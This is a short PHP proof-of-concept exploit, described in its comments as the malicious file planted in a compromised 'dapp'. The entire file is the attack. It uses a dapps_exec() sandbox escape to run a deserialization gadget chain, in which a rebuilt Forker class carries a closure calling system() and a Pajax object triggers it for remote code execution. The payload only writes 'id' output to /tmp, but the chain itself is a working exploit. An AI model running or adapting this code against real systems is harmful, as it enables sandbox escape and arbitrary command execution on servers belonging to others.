<?php

// This script represents the malicious file within a compromised dapp.
// When triggered by a web request, it uses the dapps_exec() sandbox
// escape to execute a command that triggers the Pajax RCE.

// The malicious command to be executed in the unsandboxed context
$command = '
    // Re-define the Forker class to create our gadget
    class Forker {
        private $parent;
        private $listener;
        private $childs = [];
        public function __construct($closure) {
            $this->parent = [$closure, []];
        }
    }

    // Create the malicious Closure with the command to run
    $closure = function() {
        system("id > /tmp/pwned_dapp");
    };

    // Create the gadget
    $forker = new Forker($closure);

    // Create a Pajax object to trigger the deserialization
    $pajax = new Pajax();
    $pajax->class = "Forker";
    $pajax->params = ["exec"];

    // Trigger the vulnerability
    $pajax->run($forker);
';

// Use the sandbox escape to execute the command
dapps_exec($command);

?>
